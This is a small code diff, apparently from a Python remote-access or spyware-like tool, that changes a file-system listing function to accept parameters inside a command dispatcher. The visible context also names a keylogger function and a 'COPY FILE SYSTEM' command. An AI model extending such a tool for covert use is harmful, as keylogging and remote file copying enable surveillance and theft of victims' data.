@@ -70,9 +70,9 @@ def get_keylogger(seconds=10):
 
 
 # File System
-def list_fileSystem():
+def list_fileSystem(parameters):
     doit = FileSystem()
-    tree = doit.getTree()
+    tree = doit.getTree(parameters)
     return tree
 
 
@@ -174,8 +174,7 @@ def execute(command, parameter=None):  # parameter
         return content
 
     elif command == 'VIEW FILE SYSTEM':
-        content = list_fileSystem()
-        print(content)
+        content = list_fileSystem(parameter)
         return content
 
     elif command == 'COPY FILE SYSTEM':
